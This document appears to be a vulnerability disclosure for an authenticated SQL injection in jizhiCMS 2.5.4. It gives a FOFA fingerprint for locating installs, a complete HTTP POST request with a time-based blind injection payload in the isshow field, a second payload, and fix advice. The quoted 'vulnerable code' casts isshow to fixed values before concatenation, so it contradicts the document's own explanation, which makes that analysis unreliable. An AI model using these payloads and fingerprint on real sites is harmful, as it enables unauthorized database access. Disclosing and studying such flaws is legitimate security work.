# jizhicms-sql
The jizhicms version 2.5.4 contains a backend SQL injection vulnerability.
There is a backend SQL injection vulnerability in jizhiCMS version 2.5.4.
Fingerprint
fofa:icon_hash="1657387632"
SQL Injection Vulnerability
The vulnerable file is located at:
jizhicms-2.5.4/app/admin/c/LinksController.php
This is where the backend SQL injection vulnerability exists in jizhiCMS version 2.5.4.
Vulnerability PoC (Proof of Concept)：



POST /index.php/admins/Links/addlinks/molds/links.html HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Priority: u=0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://154.217.245.237:1234/index.php/admins/Links/addlinks/tid/1/molds/links.html
Cookie: PHPSESSID=umgc0aguscmvgmjv96mvjmpd81
Accept-Encoding: gzip, deflate
Origin: http://154.217.245.237:1234
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Content-Length: 47

go=1&tid=1&title=qwd&url=www.baidu.com&isshow=1'and(select*from(select+sleep(6))a/**/union/**/select+1)='

<img width="950" alt="image" src="https://github.com/user-attachments/assets/bef3233f-eaeb-4df7-a233-25e328653e10" />


Vulnerability Type: Backend SQL Injection
Affected File/Function: LinksController.php – Parameter handling for isshow
Component: jizhiCMS 2.5.4
Attack Vector: Authenticated POST request
Vulnerable Code:
if($this->frparam('isshow')){
    if($this->frparam('isshow')==1){
        $isshow=1;
    }else if($this->frparam('isshow')==2){
        $isshow=0;
    }else{
        $isshow = 2; // default fallback
    }
    $sql .= ' and isshow='.$isshow; // directly concatenated
}
Description:

This code is vulnerable to SQL injection due to the direct concatenation of unvalidated user input ($isshow) into the SQL query string. While the application attempts to convert the isshow parameter to specific numeric values (1 or 0), it fails to enforce strong input validation or type safety. If an attacker supplies a specially crafted payload through isshow, such as:
isshow=1' AND (SELECT * FROM (SELECT SLEEP(5))a) AND '1'='1
The application may construct a query that causes SQL logic manipulation or time-based blind injection, depending on the database context.

Impact:
Unauthorized SQL execution
Information disclosure
Potential remote code execution (if combined with other vulnerabilities)
Database integrity compromise
Recommendation:
Sanitize and strictly cast input values to expected types (e.g., use (int)$this->frparam('isshow'))
Replace raw SQL concatenation with prepared statements (parameterized queries)

![image](https://github.com/user-attachments/assets/476d6f79-36af-46a7-a087-2debeb7fc467)
![image](https://github.com/user-attachments/assets/fbba5834-5a02-42e3-b8b1-72be96c69872)



